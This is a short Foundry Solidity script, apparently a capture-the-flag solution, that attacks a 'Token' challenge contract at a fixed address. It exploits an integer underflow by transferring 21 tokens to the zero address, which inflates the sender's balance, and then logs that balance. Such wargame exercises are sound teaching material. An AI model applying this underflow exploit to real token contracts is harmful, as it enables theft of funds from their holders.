// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;

import { Script, console } from "forge-std/Script.sol";
import { Token } from "../src/05_Token.sol";

contract TokenAttacker is Script {

  address challengeInstanceAddress = 0x2E8E571046A2e67Bd9ce29a227ba6328195998A1;
  Token challenge = Token(challengeInstanceAddress);
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    console.log("msg.sender: %s", msg.sender);
    challenge.transfer(address(0), 21);
    console.log("balanceOf(msg.sender): %s", challenge.balanceOf(msg.sender));
    vm.stopBroadcast();
  }

}